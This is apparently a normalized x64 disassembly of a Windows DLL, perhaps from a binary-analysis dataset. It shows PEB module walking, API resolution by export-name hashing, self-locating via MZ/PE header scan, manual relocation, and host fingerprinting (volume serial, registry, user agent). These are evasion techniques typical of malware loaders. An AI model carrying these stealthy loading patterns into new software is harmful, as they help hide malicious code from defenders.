lea r8d [ r9 + 0xa ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rsi
call [ rbx ]
lea rcx [ rsp + 0x30 ]
call [ GetSystemInfo@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0xb ]
mov [ rsp + 0x20 ] rsi
call [ rbx ]
xor ebx ebx
cmp [ rdi + 0x4 ] 0x5
jne r-xdata
mov r9d 0x6
cmp [ rdi + 0x4 ] r9d
jne r-xdata
mov ecx [ rdi + 0x8 ]
test ecx ecx
je r-xdata
mov rcx rdi
call sub_180002148
mov rsi [ rsp + 0x78 ]
mov al bl
mov rbx [ rsp + 0x70 ]
add rsp 0x60
pop rdi
retn
cmp [ rdi + 0x9a ] 0x1
mov ecx [ rdi + 0x8 ]
jne r-xdata
mov bl 0x1
jmp r-xdata
dec ecx
je r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov bl 0x2
jmp r-xdata
dec ecx
jne r-xdata
mov bl 0xb
dec ecx
je r-xdata
mov bl 0x7
jmp r-xdata
dec ecx
je r-xdata
cmp [ rdi + 0x9a ] 0x1
jne r-xdata
mov bl 0xc
jmp r-xdata
dec ecx
je r-xdata
mov bl 0x8
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x8000
test [ rdi + 0x98 ] ax
je r-xdata
cmp [ rsp + 0x30 ] 0x9
jne r-xdata
mov bl 0xd
jmp r-xdata
dec ecx
jne r-xdata
xor r8d r8d
mov dx 0x3
movzx ecx r9w
call sub_1800021b0
test al al
setne bl
add bl 0x9
jmp r-xdata
dec ecx
jne r-xdata
mov esi 0x59
mov ecx esi
call [ GetSystemMetrics@IAT ]
test eax eax
jne r-xdata
mov bl 0x4
jmp r-xdata
mov bl 0x3
jmp r-xdata
mov bl 0xe
jmp r-xdata
mov bl 0xa
jmp r-xdata
mov ecx esi
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x6
jmp r-xdata
sub_180002628
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rdi
sub rsp 0x30
and [ rax + 0x10 ] 0x0
lea rbp [ r--data ]
lea r8 [ rax + 0x10 ]
mov rdx rbp
xor ecx ecx
call ObtainUserAgentString
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0xc ]
mov [ rsp + 0x20 ] rbp
call [ rbx ]
mov ecx [ rsp + 0x48 ]
call j_sub_180002178
lea r8 [ rsp + 0x48 ]
xor ecx ecx
mov rdx rax
mov rdi rax
call ObtainUserAgentString
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0xd ]
mov [ rsp + 0x20 ] rbp
call [ rbx ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x50 ]
mov rax rdi
add rsp 0x30
pop rdi
retn
sub_1800026e8
mov r11 rsp
push rbx
sub rsp 0x40
xor eax eax
lea r9 [ r11 + 0x10 ]
xor r8d r8d
mov [ rsp + 0x38 ] eax
mov [ r11 - 0x18 ] rax
mov [ r11 - 0x20 ] rax
xor edx edx
xor ecx ecx
mov [ r11 - 0x28 ] rax
mov [ rsp + 0x58 ] eax
call [ GetVolumeInformationA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0xe ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov eax [ rsp + 0x58 ]
add rsp 0x40
pop rbx
retn
sub_18000275c
push rbx
sub rsp 0x30
lea rax [ rsp + 0x50 ]
lea rdx [ r--data ]
mov r9d 0x1
xor r8d r8d
mov rcx 0xffffffff80000002
mov [ rsp + 0x20 ] rax
call [ RegOpenKeyExA@IAT ]
mov rcx [ rsp + 0x50 ]
lea r11 [ rsp + 0x48 ]
mov [ rsp + 0x28 ] r11
and [ rsp + 0x20 ] 0x0
lea rdx [ r--data ]
xor r9d r9d
xor r8d r8d
call [ RegQueryValueExA@IAT ]
mov ecx [ rsp + 0x48 ]
call j_sub_180002178
mov rcx [ rsp + 0x50 ]
lea rdx [ r--data ]
mov rbx rax
lea rax [ rsp + 0x48 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
xor r8d r8d
mov [ rsp + 0x20 ] rbx
call [ RegQueryValueExA@IAT ]
mov rcx [ rsp + 0x50 ]
call [ RegCloseKey@IAT ]
mov rax rbx
add rsp 0x30
pop rbx
retn
sub_1800027f8
sub rsp 0x28
cmp ecx 0xe
jg r-xdata
cmp ecx 0x15
jg r-xdata
je r-xdata
sub ecx 0x16
je r-xdata
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
cmp ecx 0x7
jg r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0xf
je r-xdata
lea r8 [ r--data ]
xor r9d r9d
mov edx eax
add rsp 0x28
jmp sub_18000543c
sub ecx 0x8
je r-xdata
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
xor eax eax
add rsp 0x28
retn
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub_180002b38
sub rsp 0x28
cmp ecx 0x65
jg r-xdata
mov eax 0x131
cmp ecx eax
jg r-xdata
je r-xdata
mov eax 0x194
cmp ecx eax
jg r-xdata
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
cmp ecx 0xf
jg r-xdata
sub ecx 0x195
je r-xdata
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
cmp ecx 0x6e
jg r-xdata
lea r8 [ r--data ]
xor r9d r9d
mov edx eax
add rsp 0x28
jmp sub_18000543c
cmp ecx 0x16
jg r-xdata
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x132
je r-xdata
sub ecx 0x6f
je r-xdata
je r-xdata
sub ecx 0x17
je r-xdata
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
cmp ecx 0x8
jg r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x5a
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x66
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x10
je r-xdata
sub ecx 0x9
je r-xdata
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x5e
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x64
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x63
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub ecx 0x5b
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
xor eax eax
add rsp 0x28
retn
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
je r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
dec ecx
jne r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180005420
lea rcx [ r--data ]
jmp r-xdata
sub_1800032d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ gs : 0x60 ]
mov esi ecx
mov rdi [ rax + 0x18 ]
add rdi 0x10
mov rbx [ rdi ]
jmp r-xdata
cmp rbx rdi
jne r-xdata
movzx edx [ rbx + 0x58 ]
mov rcx [ rbx + 0x60 ]
mov r8b 0x1
call sub_1800059f8
cmp eax esi
je r-xdata
xor eax eax
mov rax [ rbx + 0x30 ]
jmp r-xdata
mov rbx [ rbx ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180003358
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
mov dl 0x2e
call sub_18000562c
mov rdi rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov edx eax
mov rcx rbx
sub edx ebx
call sub_18000570c
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rax
mov rbx rax
call sub_18000574c
mov rcx rbx
mov rsi rax
call sub_1800042fc
cmp [ rdi + 0x1 ] 0x23
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rcx [ rdi + 0x1 ]
xor r8d r8d
xor edx edx
call sub_180005a58
lea rcx [ rdi + 0x2 ]
call sub_180005604
jmp r-xdata
mov r8d eax
xor edx edx
mov rcx rsi
call sub_1800035dc
sub_180003430
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rax [ rw-data ]
mov rdi rcx
test rax rax
jne r-xdata
mov rcx rdi
call rax
mov rbx [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x40
pop rbp
retn
lea rcx [ rbp - 0x20 ]
mov [ rbp - 0x20 ] 0xa2a17128
mov [ rbp - 0x1c ] 0x2c821fb0
mov [ rbp - 0x18 ] 0x2729fc95
mov [ rbp - 0x14 ] al
mov [ rbp - 0x10 ] al
mov [ rbp - 0xf ] rax
mov [ rbp - 0x7 ] eax
call sub_180005420
lea rdx [ rbp - 0x20 ]
lea rcx [ rbp - 0x10 ]
mov r8d eax
call sub_180003fa4
lea rcx [ rbp - 0x10 ]
call sub_180005420
mov ebx eax
call sub_180005b20
lea rdx [ rbp - 0x10 ]
mov rcx rax
mov r8d ebx
call sub_180006e34
call sub_180003330
mov edx 0x1
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
xor ecx ecx
mov rbx rax
call sub_18000365c
lea rdx [ rbp - 0x10 ]
mov rcx rbx
call rax
mov [ rw-data ] rax
sub_1800034f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
xor r15d r15d
mov r12d edx
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
movsxd rax [ rcx + 0x3c ]
mov edi [ rax + rcx + 0x88 ]
mov r14d [ rax + rcx + 0x8c ]
mov eax edx
shr eax 0x10
add rdi rcx
test ax ax
jne r-xdata
mov ebp [ rdi + 0x20 ]
mov esi [ rdi + 0x24 ]
mov r13d r15d
add rbp rcx
add rsi rcx
cmp [ rdi + 0x18 ] r15d
jbe r-xdata
movzx eax dx
sub eax [ rdi + 0x10 ]
jmp r-xdata
mov ecx [ rbp ]
xor r8d r8d
xor edx edx
add rcx rbx
call sub_180005a58
cmp eax r12d
je r-xdata
test eax eax
js r-xdata
movzx eax [ rsi ]
inc r13d
add rbp 0x4
add rsi 0x2
cmp r13d [ rdi + 0x18 ]
jb r-xdata
movsxd rdx eax
mov eax [ rdi + 0x1c ]
lea rcx [ rbx + rax ]
mov eax edi
mov r8d [ rcx + rdx * 4 ]
add r8 rbx
cmp r8 rax
jbe r-xdata
mov rax r8
jmp r-xdata
mov rdx r8
sub rdx rax
cmp rdx r14
jae r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rcx r8
call sub_180003358
mov r8d eax
sub_1800035dc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor ebx ebx
mov esi r8d
mov rdi rcx
cmp edx 0x1
jne r-xdata
test rcx rcx
jne r-xdata
call sub_180003330
mov rbx rax
jmp r-xdata
mov rcx rdi
call sub_1800036ac
mov rbx rax
test rax rax
jne r-xdata
mov ecx edx
call sub_1800027f8
mov rdi rax
test rbx rbx
jne r-xdata
test esi esi
jne r-xdata
mov rcx rdi
call sub_180003430
mov rbx rax
test rdi rdi
je r-xdata
mov edx esi
mov rcx rbx
call sub_1800034f4
mov rax rbx
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000365c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx r9d
xor r10d r10d
lea rdi [ rw-data ]
lea eax [ rbx - 0x1 ]
cmp eax 0x239
ja r-xdata
test r10 r10
jne r-xdata
mov r10 [ rdi + rbx * 8 ]
mov rax r10
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call sub_1800035dc
lea ecx [ rbx - 0x1 ]
mov r10 rax
cmp ecx 0x239
ja r-xdata
mov [ rdi + rbx * 8 ] rax
sub_1800036d8
test r9 r9
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov rsi r8
mov rdi rdx
mov rbx rcx
mov r10 rcx
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
mov eax [ r10 + 0x4 ]
xor ecx ecx
lea rdx [ r10 + 0x8 ]
sub rax 0x8
test rax 0xfffffffffffffffe
jbe r-xdata
mov eax [ r10 + 0x4 ]
add r10 rax
mov rax r10
sub rax rbx
cmp rax r9
jb r-xdata
movzx r8d [ rdx ]
mov eax r8d
shr r8w 0xc
and eax 0xfff
add eax [ r10 ]
cmp r8w 0x3
je r-xdata
cmp [ r10 + 0x4 ] 0x0
je r-xdata
add [ rax + rdi ] rsi
cmp r8w 0xa
jne r-xdata
mov eax [ r10 + 0x4 ]
inc rcx
add rdx 0x2
sub rax 0x8
shr rax 0x1
cmp rcx rax
jb r-xdata
sub_180003778
test rcx rcx
lea rdx [ sub_180003778 ]
cmovne rdx rcx
mov ecx 0x1000
and rdx 0xffffffffffff0000
sub rdx rcx
jmp r-xdata
cmp [ rdx + 0x3c ] ecx
jge r-xdata
mov eax 0x5a4d
cmp [ rdx ] ax
jne r-xdata
movsxd rax [ rdx + 0x3c ]
cmp [ rax + rdx ] 0x4550
je r-xdata
mov rax rdx
retn
sub_1800037b8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp rcx
mov ecx 0x11
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rcx rbp
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp rax
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0x9 ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x11
call sub_180003410
sub_180003870
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x40
mov r14 rcx
mov ecx 0x19
mov rbp r9
mov r12 r8
mov r13 rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rdx r13
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x80 ]
mov rcx r14
mov [ rsp + 0x20 ] rax
call rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
retn
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0xa ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x19
call sub_180003410
sub_180003970
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r14 rcx
mov ecx 0x26
mov ebp r9d
mov r12d r8d
mov r13 rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rax [ rsp + 0x78 ]
mov r9d ebp
mov r8d r12d
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x70 ]
mov rdx r13
mov rcx r14
mov [ rsp + 0x20 ] eax
call rbx
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0x2 ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x26
call sub_180003410
sub_180003a5c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r14 rcx
mov ecx 0x28
mov ebp r9d
mov r12d r8d
mov r13d edx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rax [ rsp + 0x70 ]
mov r9d ebp
mov r8d r12d
mov edx r13d
mov rcx r14
mov [ rsp + 0x20 ] rax
call rbx
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0x1 ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x28
call sub_180003410
sub_180003b40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp rcx
mov ecx 0x2d
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rcx rbp
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp rax
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0x8 ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x2d
call sub_180003410
sub_180003bf8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov r13d ecx
mov ecx 0x5a
mov ebp r8d
mov r12d edx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov r8d ebp
mov edx r12d
mov ecx r13d
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
jmp rax
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0xb ]
